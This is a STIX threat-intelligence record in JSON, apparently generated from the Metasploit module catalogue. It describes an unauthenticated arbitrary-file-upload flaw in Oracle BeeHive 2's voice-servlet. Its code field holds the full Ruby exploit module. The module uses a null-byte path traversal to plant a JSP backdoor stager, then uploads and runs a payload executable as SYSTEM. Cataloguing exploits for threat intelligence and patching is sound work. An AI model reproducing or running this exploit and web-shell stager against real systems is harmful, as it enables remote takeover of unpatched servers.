{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--907b4621-4698-484d-a026-8bdb8ae99684",
    "created": "2024-08-14T16:51:57.594572Z",
    "modified": "2024-08-14T16:51:57.594577Z",
    "name": "\"Oracle BeeHive 2 voice-servlet prepareAudioToPlay() Arbitrary File Upload\"",
    "description": " This module exploits a vulnerability found in Oracle BeeHive. The prepareAudioToPlay method found in voice-servlet can be abused to write a malicious file onto the target machine, and gain remote arbitrary code execution under the context of SYSTEM. Authentication is not required to exploit this vulnerability.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/oracle_beehive_prepareaudiotoplay.rb",
            "external_id": "oracle_beehive_prepareaudiotoplay.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/topics/security/cpuoct2015-2367953.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Oracle BeeHive 2 voice-servlet prepareAudioToPlay() Arbitrary File Upload\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Oracle BeeHive. The prepareAudioToPlay method\n        found in voice-servlet can be abused to write a malicious file onto the target machine, and\n        gain remote arbitrary code execution under the context of SYSTEM. Authentication is not\n        required to exploit this vulnerability.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'mr_me <steventhomasseeley[at]gmail.com>', # Source Incite. Vulnerability discovery, PoC\n          'sinn3r'                                  # MSF module\n        ],\n      'References'     =>\n        [\n          [ 'ZDI', '15-550'],\n          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/cpuoct2015-2367953.html' ]\n        ],\n      'DefaultOptions'  =>\n        {\n          'RPORT'    => 7777\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Oracle Beehive 2', {}]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2015-11-10',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Oracle Beehive's base directory\", '/'])\n      ])\n  end\n\n\n  def check\n    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'voice-servlet', 'prompt-qa/'))\n\n    if res.nil?\n      vprint_error(\"Connection timed out.\")\n      return Exploit::CheckCode::Unknown\n    elsif res && (res.code == 403 || res.code == 200)\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::NotVulnerable, 'Target does not have voice-servlet')\n    end\n\n    # Init some names\n    # We will upload to:\n    # C:\\oracle\\product\\2.0.1.0.0\\beehive_2\\j2ee\\BEEAPP\\applications\\voice-servlet\\prompt-qa\\\n    exe_name = \"#{Rex::Text.rand_text_alpha(5)}.exe\"\n    stager_name = \"#{Rex::Text.rand_text_alpha(5)}.jsp\"\n    print_status(\"Stager name is: #{stager_name}\")\n    print_status(\"Executable name is: #{exe_name}\")\n    register_files_for_cleanup(\"../BEEAPP/applications/voice-servlet/voice-servlet/prompt-qa/#{stager_name}\")\n\n    # Ok fire!\n    print_status(\"Uploading stager...\")\n    res = upload_stager(stager_name, exe_name)\n\n    # Hmm if we fail to upload the stager, no point to continue.\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out.')\n    end\n\n    print_status(\"Uploading payload...\")\n    upload_payload(stager_name)\n  end\n\n  # Our stager is basically a backdoor that allows us to upload an executable with a POST request.\n  def get_jsp_stager(exe_name)\n    jsp = %Q|<%@ page import=\"java.io.*\" %>\n<%\n  ByteArrayOutputStream buf = new ByteArrayOutputStream();\n  BufferedReader reader = request.getReader();\n  int tmp;\n  while ((tmp = reader.read()) != -1) { buf.write(tmp); }\n  FileOutputStream fostream = new FileOutputStream(\"#{exe_name}\");\n  buf.writeTo(fostream);\n  fostream.close();\n  Runtime.getRuntime().exec(\"#{exe_name}\");\n%>|\n\n    # Since we're sending it as a GET request, we want to keep it smaller so\n    # we gsub stuff we don't want.\n    jsp.gsub!(\"\\n\", '')\n    jsp.gsub!('  ', ' ')\n    Rex::Text.uri_encode(jsp)\n  end\n\n\n  def upload_stager(stager_name, exe_name)\n    # wavfile = Has to be longer than 4 bytes (otherwise you hit a java bug)\n\n    jsp_stager = get_jsp_stager(exe_name)\n    uri = normalize_uri(target_uri.path, 'voice-servlet', 'prompt-qa', 'playAudioFile.jsp')\n    send_request_cgi({\n      'method'        => 'POST',\n      'uri'           => uri,\n      'encode_params' => false, # Don't encode %00 for us\n      'vars_post'    => {\n        'sess'       => \"..\\\\#{stager_name}%00\",\n        'recxml'     => jsp_stager,\n        'audiopath'  => Rex::Text.rand_text_alpha(1),\n        'wavfile'    => \"#{Rex::Text.rand_text_alpha(5)}.wav\",\n        'evaluation' => Rex::Text.rand_text_alpha(1)\n      }\n    })\n  end\n\n  def upload_payload(stager_name)\n    uri = normalize_uri(target_uri.path, 'voice-servlet', 'prompt-qa', stager_name)\n    send_request_cgi({\n      'method' => 'POST',\n      'uri'    => uri,\n      'data'   => generate_payload_exe(code: payload.encoded)\n    })\n  end\n\n  def print_status(msg)\n    super(\"#{rhost}:#{rport} - #{msg}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-11-10",
    "x_mitre_platforms": [
        "win'"
    ]
}